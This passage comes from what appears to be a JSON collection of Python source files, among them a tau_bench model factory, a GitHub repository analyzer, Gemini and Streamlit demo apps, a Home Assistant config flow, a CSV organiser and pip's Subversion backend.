None = None,\n    ) -> str:\n        raise NotImplementedError\n\n    @abc.abstractmethod\n    def parse_force(\n        self,\n        instruction: str,\n        typ: type[T] | dict[str, Any],\n        text: str | None = None,\n        examples: list[ParseForceDatapoint] | None = None,\n        temperature: float | None = None,\n    ) -> T | dict[str, Any]:\n        raise NotImplementedError\n\n    @abc.abstractmethod\n    def score(\n        self,\n        instruction: str,\n        text: str,\n        min: int,\n        max: int,\n        examples: list[ScoreDatapoint] | None = None,\n        temperature: float | None = None,\n    ) -> int:\n        raise NotImplementedError\n\n\ndef default_model() -> GeneralModel:\n    from tau_bench.model_utils.model.openai import OpenAIModel\n\n    return OpenAIModel()\n\n\ndef default_quick_model() -> GeneralModel:\n    from tau_bench.model_utils.model.openai import OpenAIModel\n\n    return OpenAIModel(model=\"gpt-4o-mini\")\n\n\ndef model_factory(\n    model_id: str,\n    platform: str | Platform,\n    base_url: str | None = None,\n    api_key: str | None = None,\n    temperature: float = 0.0,\n) -> GeneralModel:\n    if isinstance(platform, str):\n        platform = Platform(platform)\n    if platform == Platform.OPENAI:\n        from tau_bench.model_utils.model.openai import OpenAIModel\n\n        return OpenAIModel(model=model_id, api_key=api_key, temperature=temperature)\n    elif platform == Platform.MISTRAL:\n        from tau_bench.model_utils.model.mistral import MistralModel\n\n        return MistralModel(model=model_id, api_key=api_key, temperature=temperature)\n    elif platform == Platform.ANTHROPIC:\n        from tau_bench.model_utils.model.claude import ClaudeModel\n\n        return ClaudeModel(model=model_id, api_key=api_key, temperature=temperature)\n\n    elif platform == Platform.ANYSCALE:\n        from tau_bench.model_utils.model.anyscale import AnyscaleModel\n\n        return AnyscaleModel(model=model_id, api_key=api_key, temperature=temperature)\n    elif platform == Platform.OUTLINES:\n        if base_url is None:\n            raise ValueError(\"base_url must be provided for custom models\")\n        from tau_bench.model_utils.model.outlines_completion import OutlinesCompletionModel\n\n        return OutlinesCompletionModel(model=model_id, base_url=base_url, temperature=temperature)\n    elif platform == Platform.VLLM_CHAT:\n        if base_url is None:\n            raise ValueError(\"base_url must be provided for custom models\")\n        from tau_bench.model_utils.model.",
    "import os\r\nimport requests\r\nimport base64\r\nimport time\r\nimport sys\r\n\r\nclass GitHubAnalyzer:\r\n    def __init__(self, token, repo_name):\r\n        self.token = token\r\n        self.repo_name = repo_name\r\n        self.base_url = f\"https://api.github.com/repos/{repo_name}\"\r\n        self.headers = {'Authorization': f'token {token}'}\r\n\r\n    def fetch_data(self, url):\r\n        response = requests.get(url, headers=self.headers)\r\n        if response.status_code == 200:\r\n            return response.json()\r\n        else:\r\n            response.raise_for_status()\r\n\r\n    def check_documentation(self):\r\n        url = f\"{self.base_url}/readme\"\r\n        try:\r\n            response = self.fetch_data(url)\r\n            readme = base64.b64decode(response['content']).decode('utf-8')\r\n            essential_sections = ['installation', 'usage', 'contributing', 'license', 'changelog']\r\n            missing_sections = [section for section in essential_sections if section not in readme.lower()]\r\n            if not missing_sections:\r\n                return \"README.md is present and contains all essential sections.\"\r\n            else:\r\n                return f\"README.md is present but missing sections: {', '.join(missing_sections)}.\"\r\n        except requests.exceptions.HTTPError:\r\n            return \"README.md file is missing.\"\r\n\r\n    def analyze_issues(self):\r\n        url = f\"{self.base_url}/issues?state=open\"\r\n        open_issues = self.fetch_data(url)\r\n        unresolved_issues = []\r\n        for issue in open_issues:\r\n            comments_url = issue['comments_url']\r\n            comments = self.fetch_data(comments_url)\r\n            resolved = any('resolved' in comment['body'].lower() for comment in comments)\r\n            if not resolved:\r\n                unresolved_issues.append(issue)\r\n        inactive_issues = [issue for issue in unresolved_issues if (issue['updated_at'] < issue['created_at'])]\r\n        if not unresolved_issues:\r\n            return \"No unresolved open issues.\"\r\n        elif inactive_issues:\r\n            return f\"Found {len(unresolved_issues)} unresolved open issues, including {len(inactive_issues)} with long inactivity.\"\r\n        else:\r\n            return f\"Found {len(unresolved_issues)} unresolved open issues.\"\r\n\r\n    def analyze_pull_requests(self):\r\n        url = f\"{self.base_url}/pulls?state=open\"\r\n        open_pulls = self.fetch_data(url)\r\n        unmerged_pulls = []\r\n        for pull in open_pulls:\r\n            if pull['merged_at']:\r\n                continue  # Skip merged pull requests\r\n            comments_url = pull['_links']['comments']['href']\r\n            comments = self.fetch_data(comments_url)\r\n            addressed = any('addressed' in comment['body'].lower() for comment in comments)\r\n            if not addressed:\r\n                unmerged_pulls.append(pull)\r\n        if not unmerged_pulls:\r\n            return \"No unresolved open pull requests.\"\r\n        else:\r\n            return f\"Found {len(unmerged_pulls)} unresolved open pull requests.\"\r\n\r\n    def check_dependencies(self):\r\n        manifest_files = ['package.json', 'requirements.txt']\r\n        dependencies_status = []\r\n        for file_name in manifest_files:\r\n            url = f\"{self.base_url}/contents/{file_name}\"\r\n            try:\r\n                response = self.fetch_data(url)\r\n                dependencies_status.append(f\"{file_name} found and needs further analysis.\")\r\n                # Further analysis could include checking for outdated packages\r\n            except requests.exceptions.HTTPError:\r\n                dependencies_status.append(f\"{file_name} is missing.\")\r\n        return dependencies_status\r\n\r\n    def check_security(self):\r\n        url = f\"{self.base_url}/vulnerability-alerts\"\r\n        try:\r\n            alerts = self.fetch_data(url)\r\n            if alerts['total_count'] == 0:\r\n                return \"No reported vulnerabilities.\"\r\n            else:\r\n                return f\"Found {alerts['total_count']} security vulnerabilities.\"\r\n        except requests.exceptions.HTTPError:\r\n            return \"Could not retrieve security vulnerabilities.\"\r\n\r\n    def check_license(self):\r\n        url = f\"{self.base_url}/license\"\r\n        try:\r\n            response = self.fetch_data(url)\r\n            if response['license']:\r\n                return f\"License file is present with {response['license']['name']} license.\"\r\n            else:\r\n                return \"License file is missing.\"\r\n        except requests.exceptions.HTTPError:\r\n            return \"License file is missing.\"\r\n\r\n    def check_contributing_guidelines(self):\r\n        url = f\"{self.base_url}/contents/CONTRIBUTING.md\"\r\n        try:\r\n            self.fetch_data(url)\r\n            return \"Contributing guidelines are present.\"\r\n        except requests.exceptions.HTTPError:\r\n            return \"Contributing guidelines are missing.\"\r\n\r\n    def check_issue_templates(self):\r\n        url = f\"{self.base_url}/contents/.github/ISSUE_TEMPLATE/\"\r\n        try:\r\n            self.fetch_data(url)\r\n  ",
    "# Adapted from OpenAI's Vision example \nimport base64\nimport cv2 \nfrom src.BRAIN.lm_ai import client  # point to local server \nfrom PIL import Image \n\n\ndef resize_image(image_path , require_width=336 , require_height=336):\n    with Image.open(image_path) as img:\n        width, height = img.size\n        if height <= require_height and width <= require_width:\n            return True \n        try:\n            img = img.resize((require_width, require_height), Image.ANTIALIAS)\n            img.save(image_path)\n            print(f\"Image saved to {image_path}, size: {require_width}x{require_height}\")\n        except Exception as e:\n            print(e)\n            return False \n        return True \n    \ndef capture_image_and_save(image_path=\"captured_image.png\"):\n    # Initialize the camera\n    cap = cv2.VideoCapture(0)  # 0 is the default camera\n\n    if not cap.isOpened():\n        print(\"Error: Could not open camera.\")\n        return None \n\n    try:\n        # Capture a single frame\n        ret, frame = cap.read()\n\n        if ret:\n            # Save the image in PNG format\n            cv2.imwrite(image_path, frame)\n            print(f\"Image captured and saved as {image_path}\")\n            return image_path \n        else:\n            print(\"Error: Could not capture image.\")\n            return None \n    finally:\n        # Release the camera\n        cap.release()\n        cv2.destroyAllWindows()\n\ndef detect_object(image_path , model=\"Lewdiculous/Eris_PrimeV4-Vision-32k-7B-GGUF-IQ-Imatrix\"):\n    # Ask the user for a path on the filesystem:\n    # Read the image and encode it to base64:\n    \n    if not resize_image(image_path):\n        print(\"Failed to resize image.\")\n        return None \n    \n    \n    base64_image = \"\"\n    try:\n        image = open(image_path.replace(\"'\", \"\"), \"rb\").read()\n        base64_image = base64.b64encode(image).decode(\"utf-8\")\n    except:\n        print(\"Couldn't read the image. Make sure the path is correct and the file exists.\")\n        exit()\n\n    completion = client.chat.completions.create(\n        model= model,\n        messages=[\n        {\n        \"role\": \"system\",\n        \"content\": \"This is a chat between a user and an assistant. The assistant is helping the user to describe an image.\",\n        },\n        {\n        \"role\": \"user\",\n        \"content\": [\n            {\"type\": \"text\", \"text\": \"What\u2019s in this image?.ingnore the human in background\"},\n            {\n                \"type\": \"image_url\",\n                \"image_url\": {\n                    \"url\": f\"data:image/jpeg;base64,{base64_image}\"\n                },\n            },\n        ],\n        }\n    ],\n    max_tokens=20000,\n    stream=True\n    )\n    \n    \n    result = []\n    for chunk in completion:\n        if chunk.choices[0].delta.content:\n            token = chunk.choices[0].delta.content\n            print(token , end=\"\", flush=True)\n            result.append(token)\n    if result:\n        return result \n    \n\n# if __name__ == \"__main__\":\n#     image = capture_image_and_save()\n    \n#image = capture_image_and_save()",
    "\"\"\"\r\nStreamlit Cheat Sheet\r\n\r\nApp to summarise streamlit docs v1.25.0\r\n\r\nThere is also an accompanying png and pdf version\r\n\r\nhttps://github.com/daniellewisDL/streamlit-cheat-sheet\r\n\r\nv1.25.0\r\n20 August 2023\r\n\r\nAuthor:\r\n    @daniellewisDL : https://github.com/daniellewisDL\r\n\r\nContributors:\r\n    @arnaudmiribel : https://github.com/arnaudmiribel\r\n    @akrolsmir : https://github.com/akrolsmir\r\n    @nathancarter : https://github.com/nathancarter\r\n\r\n\"\"\"\r\n\r\nimport streamlit as st\r\nfrom pathlib import Path\r\nimport base64\r\n\r\n# Initial page config\r\n\r\nst.set_page_config(\r\n     page_title='Streamlit cheat sheet',\r\n     layout=\"wide\",\r\n     initial_sidebar_state=\"expanded\",\r\n)\r\n\r\ndef main():\r\n    cs_sidebar()\r\n    cs_body()\r\n\r\n    return None\r\n\r\n# Thanks to streamlitopedia for the following code snippet\r\n\r\ndef img_to_bytes(img_path):\r\n    img_bytes = Path(img_path).read_bytes()\r\n    encoded = base64.b64encode(img_bytes).decode()\r\n    return encoded\r\n\r\n# sidebar\r\n\r\ndef cs_sidebar():\r\n\r\n    st.sidebar.markdown('''[<img src='data:image/png;base64,{}' class='img-fluid' width=32 height=32>](https://streamlit.io/)'''.format(img_to_bytes(\"logomark_website.png\")), unsafe_allow_html=True)\r\n    st.sidebar.header('Streamlit cheat sheet')\r\n\r\n    st.sidebar.markdown('''\r\n<small>Summary of the [docs](https://docs.streamlit.io/), as of [Streamlit v1.25.0](https://www.streamlit.io/).</small>\r\n    ''', unsafe_allow_html=True)\r\n\r\n    st.sidebar.markdown('__Install and import__')\r\n\r\n    st.sidebar.code('$ pip install streamlit')\r\n\r\n    st.sidebar.code('''\r\n# Import convention\r\n>>> import streamlit as st\r\n''')\r\n\r\n    st.sidebar.markdown('__Add widgets to sidebar__')\r\n    st.sidebar.code('''\r\n# Just add it after st.sidebar:\r\n>>> a = st.sidebar.radio(\\'Choose:\\',[1,2])\r\n    ''')\r\n\r\n    st.sidebar.markdown('__Magic commands__')\r\n    st.sidebar.code('''\r\n'_This_ is some __Markdown__'\r\na=3\r\n'dataframe:', data\r\n''')\r\n\r\n    st.sidebar.markdown('__Command line__')\r\n    st.sidebar.code('''\r\n$ streamlit --help\r\n$ streamlit run your_script.py\r\n$ streamlit hello\r\n$ streamlit config show\r\n$ streamlit cache clear\r\n$ streamlit docs\r\n$ streamlit --version\r\n    ''')\r\n\r\n    st.sidebar.markdown('__Pre-release features__')\r\n    st.sidebar.code('''\r\npip uninstall streamlit\r\npip install streamlit-nightly --upgrade\r\n    ''')\r\n    st.sidebar.markdown('<small>Learn more about [experimental features](https://docs.streamlit.io/library/advanced-features/prerelease#beta-and-experimental-features)</small>', unsafe_allow_html=True)\r\n\r\n    st.sidebar.markdown('''<hr>''', unsafe_allow_html=True)\r\n    st.sidebar.markdown('''<small>[Cheat sheet v1.25.0](https://github.com/daniellewisDL/streamlit-cheat-sheet)  | jan 2025 | [Tejas Salvi](https://github.com/tylar1221)</small>''', unsafe_allow_html=True)\r\n\r\n    return None\r\n\r\n##########################\r\n# Main body of cheat sheet\r\n##########################\r\n\r\ndef cs_body():\r\n\r\n    col1, col2, col3 = st.columns(3)\r\n\r\n    #######################################\r\n    # COLUMN 1\r\n    #######################################\r\n    \r\n    # Display text\r\n\r\n    col1.subheader('Display text')\r\n    col1.code('''\r\nst.text('Fixed width text')\r\nst.markdown('_Markdown_') # see #*\r\nst.caption('Balloons. Hundreds of them...')\r\nst.latex(r\\'\\'\\' e^{i\\pi} + 1 = 0 \\'\\'\\')\r\nst.write('Most objects') # df, err, func, keras!\r\nst.write(['st', 'is <', 3]) # see *\r\nst.title('My title')\r\nst.header('My header')\r\nst.subheader('My sub')\r\nst.code('for i in range(8): foo()')\r\n\r\n# * optional kwarg unsafe_allow_html = True\r\n\r\n    ''')\r\n\r\n    # Display data\r\n\r\n    col1.subheader('Display data')\r\n    col1.code('''\r\nst.dataframe(my_dataframe)\r\nst.table(data.iloc[0:10])\r\nst.json({'foo':'bar','fu':'ba'})\r\nst.metric(label=\"Temp\", value=\"273 K\", delta=\"1.2 K\")\r\n    ''')\r\n\r\n\r\n    # Display media\r\n\r\n    col1.subheader('Display media')\r\n    col1.code('''\r\nst.image('./header.png')\r\nst.audio(data)\r\nst.video(data)\r\n    ''')\r\n\r\n    # Columns\r\n\r\n    col1.subheader('Columns')\r\n    col1.code('''\r\ncol1, col2 = st.columns(2)\r\ncol1.write('Column 1')\r\ncol2.write('Column 2')\r\n\r\n# Three columns with different widths\r\ncol1, col2, col3 = st.columns([3,1,1])\r\n# col1 is wider\r\n              \r\n# Using 'with' notation:\r\n>>> with col1:\r\n>>>     st.write('This is column 1')\r\n              \r\n''')\r\n\r\n    # Tabs\r\n    \r\n    col1.subheader('Tabs')\r\n    col1.code('''\r\n# Insert containers separated into tabs:\r\n>>> tab1, tab2 = st.tabs([\"Tab 1\", \"Tab2\"])\r\n>>> tab1.write(\"this is tab 1\")\r\n>>> tab2.write(\"this is tab 2\")\r\n\r\n# You can also use \"with\" notation:\r\n>>> with tab1:\r\n>>>   st.radio('Select one:', [1, 2])\r\n''')\r\n\r\n    # Control flow\r\n\r\n    col1.subheader('Control flow')\r\n    col1.code('''\r\n# Stop execution immediately:\r\nst.stop()\r\n# Rerun script immediately:\r\nst.experimental_rerun()\r\n\r\n# Group multiple widgets:\r\n>>> with st.form(key='my_form'):\r\n>>>   username = st.text_input('Username')\r\n>>>   password = st.text_input('Password')\r\n>>>   st.form_submit_button('Login')\r\n''')\r\n    \r\n    # Persona",
    "import google.generativeai as genai\r\nfrom argparse import ArgumentParser\r\nfrom dotenv import load_dotenv\r\nimport sys\r\nfrom termcolor import cprint\r\nimport time\r\nimport os\r\nfrom datetime import datetime, timedelta\r\nfrom get_code_from_markdown import get_code_from_markdown\r\nimport json\r\nfrom json import JSONDecodeError\r\n\r\ndef list_all_files(directory):\r\n    \"\"\"\r\n    Lists all files in the given directory and its subdirectories.\r\n    Args:\r\n        directory (str): The root directory path to start searching from\r\n    Returns:\r\n        list: A list of tuples containing (file_path, last_modified_time)\r\n    \"\"\"\r\n    all_files = []\r\n    try:\r\n        # Walk through directory and subdirectories\r\n        for root, dirs, files in os.walk(directory):\r\n            for file in files:\r\n                file_path = os.path.join(root, file)\r\n                # Get last modified time\r\n                last_modified = datetime.fromtimestamp(os.path.getmtime(file_path))\r\n                all_files.append((file_path, last_modified))\r\n    except PermissionError as e:\r\n        print(f\"Permission denied accessing some paths: {e}\")\r\n    except Exception as e:\r\n        print(f\"An error occurred: {e}\")\r\n    return all_files, [fl[0] for fl in all_files]\r\n\r\ndef list_recently_modified_files(directory, hours=1):\r\n    \"\"\"\r\n    Lists files modified within the specified number of hours in the directory\r\n    and its subdirectories.\r\n    Args:\r\n        directory (str): The root directory path to start searching from\r\n        hours (int): Number of hours to look back (default is 1)\r\n    Returns:\r\n        list: A list of tuples containing (file_path, last_modified_time)\r\n    \"\"\"\r\n    # Get current time\r\n    current_time = datetime.now()\r\n    # Calculate the cutoff time\r\n    cutoff_time = current_time - timedelta(hours=hours)\r\n    # Get all files\r\n    all_files, alfls = list_all_files(directory)\r\n    # Filter for recently modified files\r\n    recent_files = [\r\n        (file_path, mod_time)\r\n        for file_path, mod_time in all_files\r\n        if mod_time >= cutoff_time\r\n    ]\r\n    return recent_files, [fl[0] for fl in recent_files]\r\n\r\ndef upload_to_gemini(path, mime_type=None):\r\n  \"\"\"Uploads the given file to Gemini.\r\n\r\n  See https://ai.google.dev/gemini-api/docs/prompting_with_media\r\n  \"\"\"\r\n  file = genai.upload_file(path, mime_type=mime_type)\r\n  print(f\"Uploaded file '{file.display_name}' as: {file.uri}\")\r\n  return file\r\n\r\ndef wait_for_files_active(files):\r\n    \"\"\"Waits for the given files to be active.\r\n\r\n    Some files uploaded to the Gemini API need to be processed before they can be\r\n    used as prompt inputs. The status can be seen by querying the file's \"state\"\r\n    field.\r\n\r\n    This implementation uses a simple blocking polling loop. Production code\r\n    should probably employ a more sophisticated approach.\r\n    \"\"\"\r\n    for name in (file.name for file in files):\r\n        file = genai.get_file(name)\r\n        while file.state.name == \"PROCESSING\":\r\n            time.sleep(10)\r\n        file = genai.get_file(name)\r\n        if file.state.name != \"ACTIVE\":\r\n            raise Exception(f\"File {file.name} failed to process\")\r\n\r\ndef get_json(content: str) -> dict:\r\n    try:\r\n        data = json.loads(content)\r\n        return data\r\n    except JSONDecodeError:\r\n        code = get_code_from_markdown(content, language=\"json\")[0]\r\n        data = json.loads(code)\r\n        return data\r\n\r\ndef main():\r\n    parser = ArgumentParser()\r\n    parser.add_argument(\"-d\", \"--directory\", help=\"Directory containing Obsidian notes for which to produce the digest\", type=str, required=True)\r\n    parser.add_argument(\"-a\", \"--allfiles\", help=\"Produce the digest for all the files in the directory, and not only for those modified in the last hour\", action=\"store_true\", required=False, default=False)\r\n    parser.add_argument(\"-k\", \"--apikey\", help=\"Provide your Google Gemini API key either as a path to your .env file containing the GOOGLE_API_KEY variable, the name of the environmental variable under which the key is stored or the key itself (the first two methods are suggested)\", required=True, type=str)\r\n    parser.add_argument(\"-s\", \"--save\", help=\"Save the digest as a Markdown File in your Obsidian vault\", required=False, action=\"store_true\", default=False)\r\n\r\n    args = parser.parse_args()\r\n    dirr = args.directory\r\n    allf = args.allfiles\r\n    apk = args.apikey\r\n    sav = args.save\r\n\r\n    if not os.path.exists(dirr):\r\n        cprint(\"ERROR! The provided directory does not exist\", color=\"red\", attrs=[\"bold\"], file=sys.stderr)\r\n        sys.exit(1)\r\n    else:\r\n        if not load_dotenv(apk):\r\n            if not os.getenv(apk):\r\n                apikey = apk\r\n                cprint(f\"WARNING! Seems like you passed your API key directly from command line: this behavior is not advised, use a .env file or an environmental variable instead.\", color=\"magenta\", attrs=[\"bold\"], file=sys.stderr)\r\n            else:\r\n                apikey = os.getenv(apk)\r\n        else:\r\n         ",
    "from homeassistant import config_entries\nimport voluptuous as vol\n\nDOMAIN = \"google_aqi\"  # Define the domain here\n\n\nclass GoogleAQIConfigFlow(config_entries.ConfigFlow, domain=DOMAIN):\n    \"\"\"Handle a config flow for Google AQI.\"\"\"\n\n    async def async_step_user(self, user_input=None):\n        \"\"\"Handle the initial step where the user configures the integration.\"\"\"\n        if user_input is not None:\n            # Validate forecast length and intervals\n            if user_input[\"forecast_length\"] > 96:\n                return self.async_show_form(\n                    step_id=\"user\",\n                    data_schema=self._get_form_schema(),\n                    errors={\"forecast_length\": \"max_length_96\"},\n                )\n            if user_input[\"interval\"] > 24 or user_input[\"interval\"] < 1:\n                return self.async_show_form(\n                    step_id=\"user\",\n                    data_schema=self._get_form_schema(),\n                    errors={\"interval\": \"invalid_interval\"},\n                )\n            if (\n                user_input[\"forecast_interval\"] > 24\n                or user_input[\"forecast_interval\"] < 1\n            ):\n                return self.async_show_form(\n                    step_id=\"user\",\n                    data_schema=self._get_form_schema(),\n                    errors={\"forecast_interval\": \"invalid_interval\"},\n                )\n\n            # Save the configuration and create an entry\n            return self.async_create_entry(title=\"Google AQI\", data=user_input)\n\n        # Get default latitude and longitude from Home Assistant configuration\n        default_latitude = self.hass.config.latitude or 0.0\n        default_longitude = self.hass.config.longitude or 0.0\n\n        # Show the form with pre-filled values\n        return self.async_show_form(\n            step_id=\"user\",\n            data_schema=self._get_form_schema(default_latitude, default_longitude),\n        )\n\n    def _get_form_schema(self, default_latitude=0.0, default_longitude=0.0):\n        \"\"\"Define the schema for the configuration form.\"\"\"\n        return vol.Schema(\n            {\n                vol.Required(\"api_key\"): str,  # API key must be entered by the user\n                vol.Optional(\"latitude\", default=default_latitude): float,\n                vol.Optional(\"longitude\", default=default_longitude): float,\n                vol.Optional(\"interval\", default=1): vol.All(\n                    int, vol.Range(min=1, max=24)\n                ),\n                vol.Optional(\"forecast_interval\", default=6): vol.All(\n                    int, vol.Range(min=1, max=24)\n                ),\n                vol.Optional(\"forecast_length\", default=48): vol.All(\n                    int, vol.Range(min=1, max=96)\n                ),\n                vol.Optional(\"get_additional_info\", default=False): bool,\n            }\n        )\n",
    "# Q&A Chatbot\n#from langchain.llms import OpenAI\n\nfrom dotenv import load_dotenv\n\nload_dotenv()  # take environment variables from .env.\n\nimport streamlit as st\nimport os\nimport pathlib\nimport textwrap\n\nimport google.generativeai as genai\n\nfrom IPython.display import display\nfrom IPython.display import Markdown\n\n\ndef to_markdown(text):\n  text = text.replace('\u2022', '  *')\n  return Markdown(textwrap.indent(text, '> ', predicate=lambda _: True))\n\nos.getenv(\"GOOGLE_API_KEY\")\ngenai.configure(api_key=os.getenv(\"GOOGLE_API_KEY\"))\n\n## Function to load OpenAI model and get respones\n\ndef get_gemini_response(question):\n    model = genai.GenerativeModel('gemini-pro')\n    response = model.generate_content(question)\n    return response.text\n\n##initialize our streamlit app\n\nst.set_page_config(page_title=\"Q&A Demo\")\n\nst.header(\"Gemini Application\")\nsubmit=st.button(\"Ask the question\")\n\nif submit:\n    \n    response=get_gemini_response(input)\n    st.subheader(\"The Response is\")\n    st.write(response)\n\n\n\n\ninput=st.text_input(\"Input: \",key=\"input\")\n\n## If ask button is clicked\n\n\n",
    "import os\nimport shutil\n#\u501f\u9274\u4e86\u7f51\u4e0aSOF\u7684\u8bba\u575b\u7684\u65b9\u6cd5\uff0c\u56e0\u800c\u4f7f\u7528\u4e86shutil\u63d0\u9ad8\u6548\u7387\n\ndef organize_csv_files(source_folder, target_folder, keywords):\n    \"\"\"\n    \u904d\u5386 source_folder \u4e0b\u6240\u6709\u5b50\u76ee\u5f55\uff0c\u627e\u5230\u540d\u5b57\u5305\u542b\u5173\u952e\u8bcd\u7684 CSV \u6587\u4ef6\uff0c\n    \u5e76\u5c06\u5b83\u4eec\u590d\u5236\u5230 target_folder \u4e0b\u5bf9\u5e94\u5173\u952e\u8bcd\u547d\u540d\u7684\u6587\u4ef6\u5939\u4e2d\u3002\n    \u53ef\u4ee5\u76f4\u63a5\u8f93\u5165target_folder\u4ee5\u521b\u5efa\u5b83\n    \n\n    \u53c2\u6570:\n        source_folder (str): \u6e90\u6587\u4ef6\u5939\u8def\u5f84(\u8fd9\u662f\u4f60\u8981\u641c\u7d22\u7684\u6587\u4ef6\u5939)\u3002\n        target_folder (str): \u76ee\u6807\u6587\u4ef6\u5939\u8def\u5f84(\u8fd9\u662f\u4f60\u8981\u653e\u7f6e\u6587\u4ef6\u5230\u7684\u6587\u4ef6\u5939)\u3002\n        keywords (list): \u5173\u952e\u8bcd\u5217\u8868(\u641c\u7d22\u6709\u8fd9\u4e9b\u5173\u952e\u8bcd\u7684csv)\u3002\n    \"\"\"\n    if not os.path.exists(target_folder):\n        os.makedirs(target_folder)\n\n    for keyword in keywords:\n        # \u5728\u76ee\u6807\u6587\u4ef6\u5939\u4e0b\u521b\u5efa\u5bf9\u5e94\u5173\u952e\u8bcd\u7684\u5b50\u6587\u4ef6\u5939\n        keyword_folder = os.path.join(target_folder, f\"{keyword}\")\n        os.makedirs(keyword_folder, exist_ok=True)\n\n    # \u904d\u5386\u6e90\u6587\u4ef6\u5939\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u548c\u5b50\u6587\u4ef6\u5939(\u8be6\u89c1csvWalk.py)\n    for root, _, files in os.walk(source_folder):\n        # \u7edf\u8ba1\u5f53\u524d\u6587\u4ef6\u5939\u4e2d\u4ee5 .csv \u7ed3\u5c3e\u7684\u6587\u4ef6\u6570\u91cf\n        csv_files = [file for file in files if file.endswith(\".csv\")]\n        if len(csv_files) != 3:\n            print(f\"Folder '{root}' does not contain exactly 3 CSV files.\")\n            continue  # \u5982\u679c\u4e0d\u7b26\u5408\u6761\u4ef6\uff0c\u8df3\u8fc7\u8be5\u6587\u4ef6\u5939\n        for file in files:\n            if file.endswith(\".csv\"):\n                for keyword in keywords:\n                    if keyword in file:\n                        # \u786e\u5b9a\u76ee\u6807\u6587\u4ef6\u5939\n                        keyword_folder = os.path.join(target_folder, f\"{keyword}\")\n                        # \u590d\u5236\u6587\u4ef6\u5230\u76ee\u6807\u6587\u4ef6\u5939\n                        src_file = os.path.join(root, file)\n                        dest_file = os.path.join(keyword_folder, file)\n                        try:\n                            shutil.copy2(src_file, dest_file)\n                        except PermissionError as e:\n                            print(f\"Failed to copy {src_file} to {dest_file}: {e}\")\n                        break\n\n\n#\u793a\u4f8b\nif __name__ == \"__main__\":\n    # \u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u5f53\u524d\u76ee\u5f55\u5c42\u7ea7    \n    source_folder = \"/Users/sesamekiller/Desktop/gkcx-data\"\n    \n    # \u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u5f53\u524d\u76ee\u5f55\u5c42\u7ea7\n    target_folder = \"/Users/sesamekiller/PycharmProjects/Graph2Neo4jDB2.0/data\"\n    \n    # \u9ed8\u8ba4keywords\u4e3ascore, plan, special (\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u4fee\u6539\u4e00\u4e0b\u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u6211\u5c31\u4e0d\u653e\u5230\u51fd\u6570\u91cc\u4e86)\n    keywords = input(\"\u8bf7\u8f93\u5165\u5173\u952e\u8bcd\u5217\u8868\uff08\u4ee5\u9017\u53f7\u5206\u9694\uff09: \").strip().split(\",\")\n    if keywords == [\"\"]: keywords = [\"score\", \"plan\", \"special\"]\n    \n    organize_csv_files(source_folder, target_folder, keywords)\n",
    "import logging\nimport os\nimport re\nfrom typing import List, Optional, Tuple\n\nfrom pip._internal.utils.misc import (\n    HiddenText,\n    display_path,\n    is_console_interactive,\n    is_installable_dir,\n    split_auth_from_netloc,\n)\nfrom pip._internal.utils.subprocess import CommandArgs, make_command\nfrom pip._internal.vcs.versioncontrol import (\n    AuthInfo,\n    RemoteNotFoundError,\n    RevOptions,\n    VersionControl,\n    vcs,\n)\n\nlogger = logging.getLogger(__name__)\n\n_svn_xml_url_re = re.compile('url=\"([^\"]+)\"')\n_svn_rev_re = re.compile(r'committed-rev=\"(\\d+)\"')\n_svn_info_xml_rev_re = re.compile(r'\\s*revision=\"(\\d+)\"')\n_svn_info_xml_url_re = re.compile(r\"<url>(.*)</url>\")\n\n\nclass Subversion(VersionControl):\n    name = \"svn\"\n    dirname = \".svn\"\n    repo_name = \"checkout\"\n    schemes = (\"svn+ssh\", \"svn+http\", \"svn+https\", \"svn+svn\", \"svn+file\")\n\n    @classmethod\n    def should_add_vcs_url_prefix(cls, remote_url: str) -> bool:\n        return True\n\n    @staticmethod\n    def get_base_rev_args(rev: str) -> List[str]:\n        return [\"-r\", rev]\n\n    @classmethod\n    def get_revision(cls, location: str) -> str:\n        \"\"\"\n        Return the maximum revision for all files under a given location\n        \"\"\"\n        # Note: taken from setuptools.command.egg_info\n        revision = 0\n\n        for base, dirs, _ in os.walk(location):\n            if cls.dirname not in dirs:\n                dirs[:] = []\n                continue  # no sense walking uncontrolled subdirs\n            dirs.remove(cls.dirname)\n            entries_fn = os.path.join(base, cls.dirname, \"entries\")\n            if not os.path.exists(entries_fn):\n                # FIXME: should we warn?\n                continue\n\n            dirurl, localrev = cls._get_svn_url_rev(base)\n\n            if base == location:\n                assert dirurl is not None\n                base = dirurl + \"/\"  # save the root url\n            elif not dirurl or not dirurl.startswith(base):\n                dirs[:] = []\n                continue  # not part of the same svn tree, skip it\n            revision = max(revision, localrev)\n        return str(revision)\n\n    @classmethod\n    def get_netloc_and_auth(\n        cls, netloc: str, scheme: str\n    ) -> Tuple[str, Tuple[Optional[str], Optional[str]]]:\n        \"\"\"\n        This override allows the auth information to be passed to svn via the\n        --username and --password options instead of via the URL.\n        \"\"\"\n        if scheme == \"ssh\":\n            # The --username and --password options can't be used for\n            # svn+ssh URLs, so keep the auth information in the URL.\n            return super().get_netloc_and_auth(netloc, scheme)\n\n        return split_auth_from_netloc(netloc)\n\n    @classmethod\n    def get_url_rev_and_auth(cls, url: str) -> Tuple[str, Optional[str], AuthInfo]:\n        # hotfix the URL scheme after removing svn+ from svn+ssh:// re-add it\n        url, rev, user_pass = super().get_url_rev_and_auth(url)\n        if url.startswith(\"ssh://\"):\n            url = \"svn+\" + url\n        return url, rev, user_pass\n\n    @staticmethod\n    def make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        extra_args: CommandArgs = []\n        if username:\n            extra_args += [\"--username\", username]\n        if password:\n            extra_args += [\"--password\", password]\n\n        return extra_args\n\n    @classmethod\n    def get_remote_url(cls, location: str) -> str:\n        # In cases where the source is in a subdirectory, we have to look up in\n        # the location until we find a valid project root.\n        orig_location = location\n        while not is_installable_dir(location):\n            last_location = location\n            location = os.path.dirname(location)\n            if location == last_location:\n                # We've traversed up to the root of the filesystem without\n                # finding a Python project.\n                logger.warning(\n                    \"Could not find Python project for directory %s (tried all \"\n                    \"parent directories)\",\n                    orig_location,\n                )\n                raise RemoteNotFoundError\n\n        url, _rev = cls._get_svn_url_rev(location)\n        if url is None:\n            raise RemoteNotFoundError\n\n        return url\n\n    @classmethod\n    def _get_svn_url_rev(cls, 